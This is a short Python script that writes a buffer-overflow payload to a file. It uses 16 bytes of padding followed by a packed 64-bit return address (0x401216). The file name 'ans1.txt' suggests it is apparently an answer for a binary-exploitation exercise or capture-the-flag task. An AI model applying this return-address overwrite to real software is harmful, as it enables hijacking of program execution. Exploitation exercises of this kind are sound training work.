import struct

padding = b'A' * 16

target_address = struct.pack('<Q', 0x401216) 
payload = padding + target_address

with open("ans1.txt", "wb") as f:
    f.write(payload)

